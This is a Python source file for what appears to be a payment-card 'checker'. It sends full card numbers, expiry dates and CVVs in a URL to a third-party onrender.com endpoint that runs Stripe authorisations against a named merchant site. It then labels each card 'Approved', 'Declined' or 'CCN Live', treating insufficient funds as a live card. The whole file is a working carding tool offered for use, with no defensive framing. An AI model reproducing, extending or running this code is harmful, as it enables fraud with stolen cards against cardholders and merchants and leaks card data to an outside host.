"""
Stripe Auth V2 Gateway
API Endpoint: https://stripe-auto-dsam.onrender.com/gateway=autostripe/key=xebec
"""
import aiohttp
import asyncio
import json

async def stripe_auth_v2_check(cc: str, mm: str, yy: str, cvv: str) -> dict:
    """
    Stripe Auth V2 gateway
    
    Args:
        cc: Card number
        mm: Expiry month
        yy: Expiry year
        cvv: CVV code
    
    Returns:
        dict: {'status': str, 'response': str}
    """
    # Format card
    full_card = f"{cc}|{mm}|{yy}|{cvv}"
    
    # API endpoint
    api_url = f"https://stripe-auto-dsam.onrender.com/gateway=autostripe/key=xebec/site=dilaboards.com/cc={full_card}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                api_url,
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=aiohttp.ClientTimeout(total=55)
            ) as resp:
                if resp.status != 200:
                    return {
                        'status': 'Unknown',
                        'response': f'HTTP {resp.status}'
                    }
                
                api_response = await resp.text()
                
                # Parse JSON response
                try:
                    data = json.loads(api_response)
                except json.JSONDecodeError:
                    # Parse as text
                    if "approved" in api_response.lower():
                        return {
                            'status': 'Approved',
                            'response': api_response[:200]
                        }
                    elif "declined" in api_response.lower():
                        return {
                            'status': 'Declined',
                            'response': api_response[:200]
                        }
                    else:
                        return {
                            'status': 'Unknown',
                            'response': api_response[:200]
                        }
                
                # Extract status + response
                api_status = (data.get("status") or "Unknown").strip()
                api_response = (data.get("response") or "No response").strip()
                
                # Format status
                lower_status = api_status.lower()
                if "approved" in lower_status:
                    status = "Approved"
                elif "declined" in lower_status:
                    status = "Declined"
                elif "ccn live" in lower_status:
                    status = "CCN Live"
                elif "incorrect" in lower_status:
                    status = "Declined"
                elif "3ds" in lower_status or "auth required" in lower_status:
                    status = "Approved"
                elif "insufficient funds" in lower_status:
                    status = "CCN Live"
                elif "expired" in lower_status:
                    status = "Declined"
                else:
                    status = api_status
                
                return {
                    'status': status,
                    'response': api_response
                }
                
    except asyncio.TimeoutError:
        return {
            'status': 'Unknown',
            'response': 'API request timed out'
        }
    except Exception as e:
        return {
            'status': 'Unknown',
            'response': f'Error: {str(e)}'
        }
